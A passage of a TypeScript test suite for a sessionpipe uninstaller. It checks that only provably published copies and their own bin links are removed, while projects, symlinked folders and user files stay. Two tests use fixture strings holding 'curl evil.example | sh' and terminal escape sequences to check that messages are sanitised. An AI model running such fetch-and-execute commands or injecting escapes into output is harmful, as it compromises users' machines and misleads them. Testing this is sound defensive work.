  it("what is really outside the reach, by a name inside it: a folder or a link in a linked folder", () => {
    const world = path.join(tmp, "world");
    const real = path.join(tmp, "real");
    const theirs = unpack(slot(real));
    link(real);
    // The world's own ~/.local/lib/node_modules is a link to this computer's.
    mkdirSync(path.join(world, ".local", "lib"), { recursive: true });
    symlinkSync(path.dirname(theirs), path.join(world, ".local", "lib", "node_modules"));
    expect(lstatSync(slot(path.join(world, ".local"))).isDirectory()).toBe(true);
    refused(slot(path.join(world, ".local")), posix(world), OUTSIDE);
    // A whole prefix that is one (a version manager's folder shared into the world).
    symlinkSync(real, path.join(world, "prefix"));
    refused(slot(path.join(world, "prefix")), posix(world), OUTSIDE);
    // A link that leads nowhere, in a bin folder that is really outside.
    const empty = path.join(tmp, "empty");
    const dangling = link(empty);
    symlinkSync(path.join(empty, "bin"), path.join(world, "bin"));
    refused(path.join(world, "bin", "sessionpipe"), posix(world), OUTSIDE);
    expect(lstatSync(dangling).isSymbolicLink()).toBe(true);
    expect(readdirSync(theirs).sort()).toEqual(FIVE);
    // With all of it in reach they are what they are.
    expect(prove(slot(path.join(world, "prefix")), posix(tmp))).toEqual(FOLDER);
    expect(prove(path.join(world, "bin", "sessionpipe"), posix(tmp))).toEqual({ is: "link" });
    expect(prove(path.join(world, "bin", "sessionpipe"), posix())).toEqual({ is: "link" });
  });

  it("a folder of another name", () => {
    const why = "it is not a folder named node_modules/sessionpipe";
    const prefix = path.join(tmp, "prefix");
    refused(unpack(slot(prefix, "sessionpipe-receiver")), posix(), why);
    refused(unpack(slot(prefix, ".sessionpipe-short")), posix(), why);
    refused(path.dirname(slot(prefix)), posix(), why);
    refused(prefix, posix(), why);
  });

  it("a project's own dependency, and any folder of the name that is in no slot", () => {
    refused(unpack(path.join(tmp, "proj", "node_modules", "sessionpipe")), posix(), NO_SLOT);
    refused(unpack(path.join(tmp, "src", "sessionpipe")), posix(), NO_SLOT);
    refused(unpack(path.join(tmp, "prefix", "lib", "sessionpipe")), posix(), NO_SLOT);
    // A leftover's name counts only in a global slot: npx leaves none.
    refused(unpack(path.join(path.dirname(npx()), ".sessionpipe-AbCd1234")), posix(), NO_SLOT);
    refused(unpack(path.join(tmp, "proj", "node_modules", ".sessionpipe-AbCd1234")), posix(), NO_SLOT);
  });

  it("M5: a project folder named `lib`: its own dependency is refused and stays, whether or not the folder above it was looked in as a prefix", () => {
    // ~/work/app/lib is a project: its package.json and its lock are beside its
    // node_modules, and it depends on sessionpipe. By its path alone that dependency is
    // `<prefix>/lib/node_modules/sessionpipe`.
    const app = path.join(tmp, "work", "app");
    const proj = path.join(app, "lib");
    const dep = unpack(slot(app));
    writeFileSync(path.join(proj, "package.json"), JSON.stringify({ name: "app", dependencies: { sessionpipe: "*" } }));
    writeFileSync(path.join(proj, "package-lock.json"), "{}");
    mkdirSync(path.join(proj, "node_modules", ".bin"));
    symlinkSync(
      path.join("..", "sessionpipe", "dist", "cli.js"),
      path.join(proj, "node_modules", ".bin", "sessionpipe"),
    );
    // Nobody looked in ~/work/app as a prefix: it is in no slot.
    refused(dep, posix(), NO_SLOT);
    refused(dep, posix(true, { prefixes: [] }), NO_SLOT);
    // Somebody did (npm's own `prefix -g` said so from inside it; a bin folder of the
    // project's is on PATH): a prefix has no package.json beside its node_modules.
    const named = posix(true, { prefixes: [...looked(), app] });
    expect(slotOf(dep, named)).toBe("global");
    refused(dep, named, PROJECT);
    // Its leftover is the project's too, and a link the project made to it is its copy's.
    const aside = unpack(slot(app, ".sessionpipe-AbCd1234"));
    refused(aside, named, PROJECT);
    refused(link(app), named, "it is the link of a copy that is there");
    expect(readdirSync(dep).sort()).toEqual(FIVE);
    // With that package.json gone it is a prefix like any other: the file is the reason.
    fake.real.unlinkSync(path.join(proj, "package.json"));
    expect(prove(dep, named)).toEqual(FOLDER);
    expect(prove(dep, posix())).toEqual({ is: "not", why: NO_SLOT });
  });

  it("M5: the lib/node_modules of a prefix that was not looked in is refused, though it is a published copy with npm's own link", () => {
    const stray = path.join(tmp, "stray");
    const dir = unpack(slot(stray));
    const bin = link(stray);
    refused(dir, posix(), NO_SLOT);
    refused(bin, posix(), "it leads to a sessionpipe that is not a global install or an npx cache entry");
    refused(dir, posix(true, { prefixes: [tmp, path.join(stray, "lib"), path.join(tmp, "stray-2")] }), NO_SLOT);
    // Looked in, it is a copy like any other.
    expect(prove(dir, posix(true, { prefixes: [stray] }))).toEqual(FOLDER);
  });

  it("M5: an npx-shaped entry outside the npx cache that was looked in, or where none was, is refused", () => {
    const other = unpack(path.join(tmp, "other", "_npx", "0a1b2c3d4e5f6a7b", "node_modules", "sessionpipe"));
    refused(other, posix(), NO_SLOT);
    const entry = unpack(npx());
    refused(entry, posix(true, { npx: null }), NO_SLOT);
    refused(entry, posix(true, { npx: path.join(tmp, "other", "_npx") }), NO_SLOT);
    // A link in a `.bin` beside such an entry leads into no slot.
    mkdirSync(path.join(path.dirname(other), ".bin"));
    const bin = path.join(path.dirname(other), ".bin", "sessionpipe");
    symlinkSync(path.join("..", "gone", "node_modules", "sessionpipe", "dist", "cli.js"), bin);
    refused(bin, posix(), "it leads to a sessionpipe that is not a global install or an npx cache entry");
  });

  it("a node_modules that is a link to somewhere else", () => {
    const prefix = path.join(tmp, "prefix");
    const elsewhere = path.join(tmp, "elsewhere", "modules");
    unpack(path.join(elsewhere, "sessionpipe"));
    mkdirSync(path.join(prefix, "lib"), { recursive: true });
    symlinkSync(elsewhere, path.dirname(slot(prefix)));
    refused(slot(prefix), posix(), LINKED);
    expect(existsSync(path.join(elsewhere, "sessionpipe", "dist", "cli.js"))).toBe(true);
  });

  it("M5: a lib or a node_modules that is a link to a project: its dependency is not a global install", () => {
    const proj = path.join(tmp, "proj");
    const dep = unpack(path.join(proj, "node_modules", "sessionpipe"));
    // The link has the very name a slot has: <prefix>/lib/node_modules -> <proj>/node_modules.
    const a = path.join(tmp, "a");
    mkdirSync(path.join(a, "lib"), { recursive: true });
    symlinkSync(path.join(proj, "node_modules"), path.dirname(slot(a)));
    expect(lstatSync(slot(a)).isDirectory()).toBe(true);
    refused(slot(a), posix(), LINKED);
    // One folder further up: <prefix>/lib -> <proj>.
    const b = path.join(tmp, "b");
    mkdirSync(b);
    symlinkSync(proj, path.join(b, "lib"));
    refused(slot(b), posix(), LINKED);
    // An npx cache entry whose node_modules is a link to it.
    const entry = path.dirname(path.dirname(npx()));
    mkdirSync(entry, { recursive: true });
    symlinkSync(path.join(proj, "node_modules"), path.join(entry, "node_modules"));
    refused(npx(), posix(), LINKED);
    expect(readdirSync(dep).sort()).toEqual(FIVE);

    // And into a project that is itself a folder named `lib`: by where it really is, it
    // is the lib/node_modules of a folder nobody looked in.
    const lib = path.join(tmp, "work", "app", "lib");
    const theirs = unpack(path.join(lib, "node_modules", "sessionpipe"));
    writeFileSync(path.join(lib, "package.json"), JSON.stringify({ name: "app" }));
    const c = path.join(tmp, "c");
    mkdirSync(path.join(c, "lib"), { recursive: true });
    symlinkSync(path.join(lib, "node_modules"), path.dirname(slot(c)));
    refused(slot(c), posix(), LINKED);
    // And where the folder above that project WAS looked in as a prefix too (npm names
    // it, say): by where it really is, it is then a slot of its kind, so only the
    // package.json beside its node_modules says whose it is. That is asked by the name
    // the folder was asked for AND by where it really is: by the asked name alone
    // (`<c>/lib` has no package.json) the project's dependency was a global install.
    const both = posix(true, { prefixes: [...looked(), path.join(tmp, "work", "app")] });
    refused(slot(c), both, PROJECT);
    refused(theirs, both, PROJECT);
    expect(readdirSync(theirs).sort()).toEqual(FIVE);
    // The other way round: a project folder whose `lib/node_modules` is a link to a real
    // prefix's. Asked by the project's name it is the project's; by its own it is ours.
    const real = unpack(slot(path.join(tmp, "real")));
    const d = path.join(tmp, "prefix9");
    mkdirSync(path.join(d, "lib"), { recursive: true });
    writeFileSync(path.join(d, "lib", "package.json"), JSON.stringify({ name: "app2" }));
    symlinkSync(path.dirname(real), path.dirname(slot(d)));
    refused(slot(d), posix(), PROJECT);
    expect(prove(real, posix())).toEqual(FOLDER);
  });

  it("a slot reached through a link to another slot of its kind is still one, where both prefixes were looked in", () => {
    // A prefix whose lib/node_modules is kept on another disk, under the same names.
    const real = unpack(slot(path.join(tmp, "disk", "prefix")));
    const prefix = path.join(tmp, "prefix");
    mkdirSync(path.join(prefix, "lib"), { recursive: true });
    symlinkSync(path.dirname(real), path.dirname(slot(prefix)));
    expect(prove(slot(prefix), posix())).toEqual(FOLDER);
    // Where it really is was not looked in: it may be anyone's.
    refused(slot(prefix), posix(true, { prefixes: [prefix] }), LINKED);
  });

  it("a folder someone linked, asked for with a slash after its name", () => {
    // With the slash the system reads the link as the folder it leads to, and that folder
    // has every look of a global install. It is the link that is asked about.
    const theirs = unpack(slot(path.join(tmp, "work")));
    const prefix = path.join(tmp, "prefix");
    mkdirSync(path.dirname(slot(prefix)), { recursive: true });
    symlinkSync(theirs, slot(prefix));
    const asked = slot(prefix) + path.sep;
    expect(lstatSync(asked).isDirectory()).toBe(true);
    const why = "it is a link that doesn't lead into a sessionpipe install";
    const before = tree();
    expect(prove(asked, posix())).toEqual({ is: "not", why });
    expect(() => remove(asked, posix())).toThrow(`${slot(prefix)} was left alone: ${why}`);
    expect(fake.gone).toEqual([]);
    expect(tree()).toEqual(before);
    expect(readdirSync(theirs).sort()).toEqual(FIVE);
  });

  it("a folder the system won't let it look in", () => {
    const dir = unpack(slot(path.join(tmp, "prefix")));
    fake.fails = (call, p) => call === "realpathSync" && p === path.dirname(dir);
    refused(dir, posix(), "the folder it is in can't be read");
    fake.fails = (call, p) => call === "readdirSync" && p === dir;
    refused(dir, posix(), "it can't be read");
    // The same of a leftover: one that can't be read is not taken for a folder npm
    // installed into.
    const aside = unpack(slot(path.join(tmp, "prefix"), ".sessionpipe-AbCd1234"));
    fake.fails = (call, p) => call === "readdirSync" && p === aside;
    refused(aside, posix(), "it can't be read");
    fake.fails = null;
    expect(prove(dir, posix())).toEqual(FOLDER);
  });

  it("a checkout or a build: anything a published sessionpipe doesn't have at its top", () => {
    const holds = (n: string) => `it holds ${n}, which no published sessionpipe has (a checkout or a build?)`;
    let n = 0;
    for (const extra of ["src", ".git", "node_modules", "tsconfig.json", "test"]) {
      const dir = unpack(slot(path.join(tmp, `prefix${n++}`)));
      if (extra.includes(".json")) writeFileSync(path.join(dir, extra), "{}");
      else mkdirSync(path.join(dir, extra));
      refused(dir, posix(), holds(extra));
    }
    // In an npx cache entry and under a leftover's name alike.
    const cached = unpack(npx());
    writeFileSync(path.join(cached, "notes.txt"), "mine");
    refused(cached, posix(), holds("notes.txt"));
    const aside = unpack(slot(path.join(tmp, "prefix"), ".sessionpipe-AbCd1234"));
    mkdirSync(path.join(aside, "src"));
    refused(aside, posix(), holds("src"));
  });

  it("a package.json that says it is something else", () => {
    const says = (name: string) => `its package.json says it is ${name}, not sessionpipe`;
    const at = (n: number, json: string) => unpack(slot(path.join(tmp, `prefix${n}`)), json);
    refused(
      at(1, JSON.stringify({ name: "sessionpipe-receiver", version: "0.15.0" })),
      posix(),
      says('"sessionpipe-receiver"'),
    );
    refused(at(2, JSON.stringify({ name: "@me/sessionpipe", version: "0.15.0" })), posix(), says('"@me/sessionpipe"'));
    refused(at(3, JSON.stringify({ version: "1.0.0" })), posix(), says("nothing"));
    refused(at(4, JSON.stringify({ name: 7, version: "1.0.0" })), posix(), says("7"));
    refused(at(5, JSON.stringify({ name: null, version: "1.0.0" })), posix(), says("null"));
    refused(at(6, JSON.stringify({ name: "left-pad", version: "1.3.0" })), posix(), says('"left-pad"'));
    refused(unpack(npx(), JSON.stringify({ name: "other", version: "0.15.0" })), posix(), says('"other"'));
  });

  it("L4: a folder of the name with no package.json that can be read is not provably published: refused, and not removed", () => {
    const prefix = (n: number) => path.join(tmp, `prefix${n}`);
    // None at all: every other entry of a published copy is there.
    refused(unpack(slot(prefix(1)), null), posix(), NO_MANIFEST);
    // One that was cut short, one that is empty, one that is no JSON.
    refused(unpack(slot(prefix(2)), '{"name":"sessionp'), posix(), NO_MANIFEST);
    refused(unpack(slot(prefix(3)), ""), posix(), NO_MANIFEST);
    refused(unpack(slot(prefix(4)), "name: sessionpipe\nversion: 0.15.0\n"), posix(), NO_MANIFEST);
    // A folder someone made by hand: only a dist with a file in it; nothing at all.
    mkdirSync(path.join(slot(prefix(5)), "dist"), { recursive: true });
    writeFileSync(path.join(slot(prefix(5)), "dist", "anything.js"), "theirs");
    refused(slot(prefix(5)), posix(), NO_MANIFEST);
    // One entry of a published copy and nothing else: a README, an empty dist.
    mkdirSync(slot(prefix(6)), { recursive: true });
    writeFileSync(path.join(slot(prefix(6)), "README.md"), "theirs");
    refused(slot(prefix(6)), posix(), NO_MANIFEST);
    mkdirSync(path.join(slot(prefix(8)), "dist"), { recursive: true });
    refused(slot(prefix(8)), posix(), NO_MANIFEST);
    // A package.json that is a folder can't be read either.
    mkdirSync(path.join(slot(prefix(7)), "package.json"), { recursive: true });
    refused(slot(prefix(7)), posix(), NO_MANIFEST);
    // In an npx cache entry, and under a leftover's name with what a copy holds.
    refused(unpack(npx(), null), posix(), NO_MANIFEST);
    refused(unpack(slot(prefix(0), ".sessionpipe-AbCd1234"), null), posix(), NO_MANIFEST);
    expect(readFileSync(path.join(slot(prefix(5)), "dist", "anything.js"), "utf8")).toBe("theirs");
    expect(readFileSync(path.join(slot(prefix(6)), "README.md"), "utf8")).toBe("theirs");
  });

  it("L4: a refusal is its reason and nothing more: no word that npm, or anyone, is to put a copy over what is not ours", () => {
    const prefix = (n: number) => path.join(tmp, `prefix${n}`);
    // (What an install that was cut off left was once marked for an `npm install -g
    // --prefix` line. Run for real, that line failed beside npm's own retired folder.)
    const CUT = { is: "not", why: NO_MANIFEST };
    expect(prove(unpack(slot(prefix(1)), null), posix())).toEqual(CUT);
    expect(prove(unpack(slot(prefix(2)), '{"name":"sessionp'), posix())).toEqual(CUT);
    expect(prove(unpack(npx(), null), posix())).toEqual(CUT);
    expect(prove(unpack(slot(prefix(0), ".sessionpipe-AbCd1234"), null), posix())).toEqual(CUT);
    for (const x of [
      prove(unpack(slot(prefix(4)), JSON.stringify({ name: "sessionpipe" })), posix()),
      prove(unpack(slot(prefix(5)), JSON.stringify({ name: "left-pad", version: "1.3.0" })), posix()),
      prove(unpack(slot(path.join(tmp, "nowhere")), null), posix()),
      prove(path.join(tmp, "gone"), posix()),
    ])
      expect(Object.keys(x).sort()).toEqual(["is", "why"]);
  });

  it("L6: an EMPTY folder of the name in a slot is ours: it is what is left of a copy that could only be emptied, and taking it away loses nothing", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = slot(prefix);
    mkdirSync(dir, { recursive: true });
    const bin = link(prefix);
    expect(prove(dir, posix())).toEqual(FOLDER);
    // Its link, which leads into it, is its own and goes with it.
    expect(binsOf(dir, posix())).toEqual([bin]);
    expect(take(dir, posix())).toEqual([dir, bin]);
    expect(existsSync(dir)).toBe(false);
    expect(readdirSync(path.join(prefix, "bin"))).toEqual([]);
    // In an npx cache entry the same.
    mkdirSync(npx(), { recursive: true });
    expect(prove(npx(), posix())).toEqual({ ...FOLDER, slot: "npx" });
    expect(take(npx(), posix())).toEqual([npx()]);
    fake.gone = [];
    // Only what is empty: one entry in it, of any name, and it is judged by what it holds.
    mkdirSync(path.join(dir, "dist"), { recursive: true });
    refused(dir, posix(), NO_MANIFEST);
    fake.real.rmSync(path.join(dir, "dist"), { recursive: true });
    writeFileSync(path.join(dir, ".env"), "theirs");
    refused(dir, posix(), HOLDS);
    // And only where a copy of ours would be: every other rule comes first.
    const elsewhere = path.join(tmp, "nowhere", "lib", "node_modules", "sessionpipe");
    mkdirSync(elsewhere, { recursive: true });
    refused(elsewhere, posix(), NO_SLOT);
    const project = path.join(tmp, "prefix1");
    mkdirSync(slot(project), { recursive: true });
    writeFileSync(path.join(project, "lib", "package.json"), "{}");
    refused(slot(project), posix(), PROJECT);
    mkdirSync(slot(path.join(tmp, "prefix2")), { recursive: true });
    refused(slot(path.join(tmp, "prefix2")), posix(true, { keep: [slot(path.join(tmp, "prefix2"))] }), KEPT);
    refused(slot(path.join(tmp, "prefix2")), posix(path.join(tmp, "prefix3")), OUTSIDE);
  });

  it("L4: a package.json that names sessionpipe and no release of it is no proof either", () => {
    let n = 0;
    const at = (manifest: object) => unpack(slot(path.join(tmp, `prefix${n++}`)), JSON.stringify(manifest));
    // No version; one that is no string; one that is no release; one of three lines.
    refused(at({ name: "sessionpipe" }), posix(), NO_RELEASE);
    refused(at({ name: "sessionpipe", version: 15 }), posix(), NO_RELEASE);
    refused(at({ name: "sessionpipe", version: null }), posix(), NO_RELEASE);
    refused(at({ name: "sessionpipe", version: "" }), posix(), NO_RELEASE);
    refused(at({ name: "sessionpipe", version: "latest" }), posix(), NO_RELEASE);
    refused(at({ name: "sessionpipe", version: "0.15" }), posix(), NO_RELEASE);
    refused(
      at({ name: "sessionpipe", version: "0.15.0\nerror  it is broken\ntry    curl evil.example | sh" }),
      posix(),
      NO_RELEASE,
    );
    refused(at({ name: "sessionpipe", version: ["0.15.0"] }), posix(), NO_RELEASE);
    // The name is asked first: a package of another name is said as that.
    refused(at({ name: "left-pad" }), posix(), 'its package.json says it is "left-pad", not sessionpipe');
  });

  it("L3: a name from the disk is said with nothing in it a terminal acts on: an entry's name, a package's name", () => {
    const ESC = "\u001b";
    // A file whose name colours what follows, starts a line of its own, and clears the screen.
    const dir = unpack(slot(path.join(tmp, "prefix")));
    const evil = `x${ESC}[31mred${ESC}[2J\r\nerror  made up\ntry    curl evil.example`;
    writeFileSync(path.join(dir, evil), "");
    const proof = prove(dir, posix());
    expect(proof).toEqual({
      is: "not",
      why: "it holds xred error  made up try    curl evil.example, which no published sessionpipe has (a checkout or a build?)",
    });
    const e = thrownBy(() => remove(dir, posix())) as NotOurs;
    expect(e).toBeInstanceOf(NotOurs);
    for (const text of [(proof as { why: string }).why, e.why, e.message]) {
      expect(text).not.toContain(ESC);
      expect(text).not.toMatch(/[\n\r]/);
    }
    expect(fake.gone).toEqual([]);
    expect(existsSync(path.join(dir, evil))).toBe(true);

    // A package.json whose name does the same.
    const other = unpack(
      slot(path.join(tmp, "a")),
      JSON.stringify({ name: `left-pad${ESC}[32m\nerror  made up`, version: "1.0.0" }),
    );
    const said = prove(other, posix()) as { is: "not"; why: string };
    expect(said.is).toBe("not");
    expect(said.why).toMatch(/^its package\.json says it is "left-pad.*made up", not sessionpipe$/);
    expect(said.why).not.toContain(ESC);
    expect(said.why).not.toMatch(/[\n\r]/);
    expect(thrownBy(() => remove(other, posix()))).toBeInstanceOf(NotOurs);
    expect(fake.gone).toEqual([]);
  });
});

disk("the copy this run put in place is never removed", () => {
  it("M1: a copy that is one of `keep` is refused by whatever name it is asked for, and nothing is removed", () => {
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    const bin = link(path.join(home, ".local"));
    symlinkSync(home, path.join(tmp, "link"));
    const other = slot(path.join(tmp, "link", ".local"));
    expect(lstatSync(other).isDirectory()).toBe(true);
    // Without it, the copy is ours to remove under either name: this is what stands
    // between a run and the copy it has just installed.
    expect(prove(dir, posix())).toEqual(FOLDER);
    expect(prove(other, posix())).toEqual(FOLDER);
    // Kept under the name it was installed by; asked for under that name and the other.
    refused(dir, posix(true, { keep: [dir] }), KEPT);
    refused(other, posix(true, { keep: [dir] }), KEPT);
    // Kept under the other name (PATH said ~/link/.local, npm said ~/home/.local).
    refused(dir, posix(true, { keep: [other] }), KEPT);
    refused(other, posix(true, { keep: [other] }), KEPT);
    // And by a name with a way round in it, or a slash after it.
    const round = [path.dirname(other), "sessionpipe", "..", "sessionpipe"].join(path.sep);
    refused(dir, posix(true, { keep: [round] }), KEPT);
    expect(prove(dir + path.sep, posix(true, { keep: [other] }))).toEqual({ is: "not", why: KEPT });
    expect(prove(round, posix(true, { keep: [dir] }))).toEqual({ is: "not", why: KEPT });
    // Its link stays with it.
    refused(bin, posix(true, { keep: [other] }), "it is the link of a copy that is there");
    expect(binTarget(bin)).toBe(dir);
    expect(readdirSync(dir).sort()).toEqual(FIVE);
  });

  it("M1: every other copy still goes, and the one kept is not touched by it", () => {
    const home = path.join(tmp, "home");
    const kept = unpack(slot(path.join(home, ".local")));
    const bin = link(path.join(home, ".local"));
    symlinkSync(home, path.join(tmp, "link"));
    const stray = unpack(slot(path.join(tmp, "a")));
    const o = posix(true, { keep: [slot(path.join(tmp, "link", ".local"))] });
    const before = tree();
    expect(take(stray, o)).toEqual([stray]);
    expect(tree()).toEqual(without(before, stray));
    expect(readFileSync(path.join(kept, "package.json"), "utf8")).toBe(PACKAGE);
    expect(binsOf(kept, o)).toEqual([bin]);
    // A folder that is not there keeps nothing.
    const b = unpack(slot(path.join(tmp, "b")));
    fake.gone = [];
    expect(take(b, posix(true, { keep: [path.join(tmp, "nothing"), slot(path.join(tmp, "c"))] }))).toEqual([b]);
  });

  it("M1: without `keep`, the copy asked for through a link to its home is removed as the copy it is", () => {
    // What the proof alone says of the fresh copy under its second name: ours. So the
    // caller names what it keeps.
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    link(path.join(home, ".local"));
    symlinkSync(home, path.join(tmp, "link"));
    const other = slot(path.join(tmp, "link", ".local"));
    const itsLink = path.join(tmp, "link", ".local", "bin", "sessionpipe");
    expect(take(other, posix())).toEqual([other, itsLink]);
    expect(fake.gone).toEqual([...emptied(other), itsLink]);
    expect(existsSync(dir)).toBe(false);
    expect(readdirSync(path.join(home, ".local", "bin"))).toEqual([]);
  });
});

disk("remove: a folder that is ours, with exactly its own bin link", () => {
  it("the folder, and nothing beside it: emptied entry by entry, its package.json last, then the folder", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    const other = unpack(slot(prefix, "sessionpipe-receiver"), JSON.stringify({ name: "sessionpipe-receiver" }));
    const before = tree();
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(fake.gone.at(-2)).toBe(path.join(dir, "package.json"));
    expect(existsSync(dir)).toBe(false);
    expect(existsSync(path.join(other, "dist", "cli.js"))).toBe(true);
    // What is left is what was there, less the one folder.
    expect(tree()).toEqual(without(before, dir));
  });

  it("M2: it is this function's alone: two arguments, an answer at once, and nothing in them is asked to remove anything", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    const bin = link(prefix);
    expect(remove).toHaveLength(2);
    // What an older caller handed in to have npm uninstall the copy is not looked at.
    const npm = vi.fn(async (_prefix: string) => {});
    const said = remove(dir, { ...posix(), npm, alone: true } as Proving);
    // The answer is there when it returns: no promise, so nothing ran in between.
    expect(Array.isArray(said)).toBe(true);
    expect(said).not.toHaveProperty("then");
    expect(said).toEqual([dir, bin]);
    expect(npm).not.toHaveBeenCalled();
    expect(fake.gone).toEqual([...emptied(dir), bin]);
    expect(existsSync(dir)).toBe(false);
  });

  it("M2: a file of the user's at the prefix's command path is no link of the copy's: it is there, byte for byte, after the copy is removed", () => {
    // A stray copy in an nvm prefix whose bin/sessionpipe is the user's own wrapper script.
    const a = path.join(tmp, "a");
    const dir = unpack(slot(a));
    mkdirSync(path.join(a, "bin"));
    const script = path.join(a, "bin", "sessionpipe");
    const text = `#!/bin/sh\n# mine\nexec node ${dir}/dist/cli.js "$@"\n`;
    writeFileSync(script, text, { mode: 0o755 });
    const mode = lstatSync(script).mode;
    writeFileSync(path.join(a, "bin", "node"), "node");
    expect(binsOf(dir, posix())).toEqual([]);
    expect(prove(script, posix())).toEqual({ is: "not", why: "it is a file npm didn't put there" });
    const before = tree();
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(readFileSync(script, "utf8")).toBe(text);
    expect(lstatSync(script).isFile()).toBe(true);
    expect(lstatSync(script).mode).toBe(mode);
    expect(tree()).toEqual(without(before, dir));
    // Nor is it removed afterwards, by itself, as a link whose copy is gone.
    fake.gone = [];
    refused(script, posix(), "it is a file npm didn't put there");

    // The same where that file is the user's link to another tool, or to a checkout.
    const b = path.join(tmp, "b");
    const dirB = unpack(slot(b));
    const tool = path.join(tmp, "tools", "other-tool");
    mkdirSync(path.dirname(tool));
    writeFileSync(tool, "#!/bin/sh\necho other\n");
    const theirs = link(b, tool);
    expect(binsOf(dirB, posix())).toEqual([]);
    fake.gone = [];
    expect(take(dirB, posix())).toEqual([dirB]);
    expect(fake.gone).toEqual(emptied(dirB));
    expect(readlinkSync(theirs)).toBe(tool);
    expect(readFileSync(tool, "utf8")).toBe("#!/bin/sh\necho other\n");
    fake.gone = [];
    refused(theirs, posix(), "it is a link that doesn't lead into a sessionpipe install");

    const c = path.join(tmp, "c");
    const dirC = unpack(slot(c));
    const checkout = unpack(path.join(tmp, "src", "sessionpipe", "packages", "cli"));
    const dev = link(c, path.join(checkout, "dist", "cli.js"));
    fake.gone = [];
    expect(take(dirC, posix())).toEqual([dirC]);
    expect(readlinkSync(dev)).toBe(path.join(checkout, "dist", "cli.js"));
    expect(readdirSync(checkout).sort()).toEqual(FIVE);
  });

  it("its own link goes with it; another package and that package's link stay", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    const bin = link(prefix);
    unpack(slot(prefix, "other"), JSON.stringify({ name: "other" }));
    const sibling = link(prefix, path.join("..", "lib", "node_modules", "other", "dist", "cli.js"), "other");
    writeFileSync(path.join(prefix, "bin", "node"), "node");
    const before = tree();
    expect(take(dir, posix())).toEqual([dir, bin]);
    // The link is the last to go: it leads nowhere by then.
    expect(fake.gone).toEqual([...emptied(dir), bin]);
    const relBin = path.relative(tmp, bin);
    expect(tree()).toEqual(without(before, dir).filter((e) => !e.startsWith(`${relBin} -> `)));
    expect(lstatSync(sibling).isSymbolicLink()).toBe(true);
    expect(readFileSync(path.join(slot(prefix, "other"), "package.json"), "utf8")).toBe('{"name":"other"}');
  });

  it("a link in its prefix that leads to another copy of sessionpipe stays, and so does that copy", () => {
    const a = path.join(tmp, "a");
    const b = path.join(tmp, "b");
    const dir = unpack(slot(a));
    const theirs = unpack(slot(b));
    const bin = link(a, path.join(theirs, "dist", "cli.js"));
    const own = link(b);
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(lstatSync(bin).isSymbolicLink()).toBe(true);
    expect(lstatSync(own).isSymbolicLink()).toBe(true);
    expect(prove(theirs, posix())).toEqual(FOLDER);
  });

  it("nothing is removed through a link: what a link inside the folder leads to stays", () => {
    const outside = path.join(tmp, "outside");
    mkdirSync(path.join(outside, "dir"), { recursive: true });
    writeFileSync(path.join(outside, "keep.txt"), "keep");
    writeFileSync(path.join(outside, "dir", "deep.txt"), "deep");
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    // A link to a file and one to a folder inside dist, and a published name that is a link.
    symlinkSync(path.join(outside, "keep.txt"), path.join(dir, "dist", "linked.js"));
    symlinkSync(path.join(outside, "dir"), path.join(dir, "dist", "linked"));
    fake.real.unlinkSync(path.join(dir, "README.md"));
    symlinkSync(path.join(outside, "keep.txt"), path.join(dir, "README.md"));
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(existsSync(dir)).toBe(false);
    expect(readFileSync(path.join(outside, "keep.txt"), "utf8")).toBe("keep");
    expect(readFileSync(path.join(outside, "dir", "deep.txt"), "utf8")).toBe("deep");

    // A dist that is itself a link to a folder somewhere else.
    const b = path.join(tmp, "b");
    mkdirSync(slot(b), { recursive: true });
    writeFileSync(path.join(slot(b), "package.json"), PACKAGE);
    symlinkSync(path.join(outside, "dir"), path.join(slot(b), "dist"));
    fake.gone = [];
    expect(take(slot(b), posix())).toEqual([slot(b)]);
    expect(fake.gone).toEqual(emptied(slot(b)));
    expect(existsSync(slot(b))).toBe(false);
    expect(readFileSync(path.join(outside, "dir", "deep.txt"), "utf8")).toBe("deep");

    // A package.json that is a link to one somewhere else: read through, never removed through.
    const c = path.join(tmp, "c");
    unpack(slot(c), null);
    writeFileSync(path.join(outside, "package.json"), PACKAGE);
    symlinkSync(path.join(outside, "package.json"), path.join(slot(c), "package.json"));
    fake.gone = [];
    expect(take(slot(c), posix())).toEqual([slot(c)]);
    expect(readFileSync(path.join(outside, "package.json"), "utf8")).toBe(PACKAGE);
  });

  it("a copy with only some of what a published one holds goes whole: what is not there is no obstacle", () => {
    const dir = slot(path.join(tmp, "prefix"));
    mkdirSync(dir, { recursive: true });
    writeFileSync(path.join(dir, "package.json"), PACKAGE);
    expect(prove(dir, posix())).toEqual(FOLDER);
    expect(take(dir, posix())).toEqual([dir]);
    expect(fake.gone).toEqual(emptied(dir));
    expect(existsSync(dir)).toBe(false);
  });

  it("an npx cache entry: the folder and the link in the `.bin` beside it", () => {
    const dir = unpack(npx());
    const modules = path.dirname(dir);
    mkdirSync(path.join(modules, ".bin"));
    const bin = path.join(modules, ".bin", "sessionpipe");
    symlinkSync(path.join("..", "sessionpipe", "dist", "cli.js"), bin);
    mkdirSync(path.join(modules, "zod"));
    writeFileSync(path.join(modules, "zod", "index.js"), "zod");
    const entry = path.dirname(modules);
    writeFileSync(path.join(entry, "package.json"), JSON.stringify({ dependencies: { sessionpipe: "0.15.0" } }));
    expect(take(dir, posix())).toEqual([dir, bin]);
    expect(fake.gone).toEqual([...emptied(dir), bin]);
    expect(readdirSync(modules).sort()).toEqual([".bin", "zod"]);
    expect(readdirSync(path.join(modules, ".bin"))).toEqual([]);
    expect(readdirSync(entry).sort()).toEqual(["node_modules", "package.json"]);
  });

  it("a whole copy moved aside: it alone; the copy beside it and that copy's link stay", () => {
    const prefix = path.join(tmp, "prefix");
    const fresh = unpack(slot(prefix));
    const bin = link(prefix);
